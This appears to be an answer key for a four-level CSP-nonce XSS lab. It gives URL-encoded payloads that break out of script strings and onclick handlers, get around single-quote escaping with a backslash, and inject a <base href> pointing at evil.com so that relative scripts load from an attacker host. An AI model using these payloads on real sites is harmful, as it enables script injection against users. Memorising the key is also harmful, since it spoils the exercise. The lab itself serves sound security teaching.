# nonce — solutions

CSP nonce-based protections bypassed via injection inside trusted contexts.

### nonce-level1

`/nonce/level1/?query=%22%3Balert(1)%2F%2F`

- payload: `";alert(1)//`
- context: inside nonced <script> string var x="QUERY"; break string

### nonce-level2

`/nonce/level2/?query=%27)%3Balert(1)%2F%2F`

- payload: `');alert(1)//`
- context: onclick="handle('QUERY')" with unsafe-hashes; break out of call

### nonce-level3

`/nonce/level3/?query=https%3A%2F%2Fevil.com%2F`

- payload: `https://evil.com/`
- context: <base href="QUERY"> with script-src 'self'; redirect relative src

### nonce-level4

`/nonce/level4/?query=%5C%27%3Balert(1)%2F%2F`

- payload: `\';alert(1)//`
- context: single-quote string, only ' escaped (not \); `\\'` leaves quote unescaped
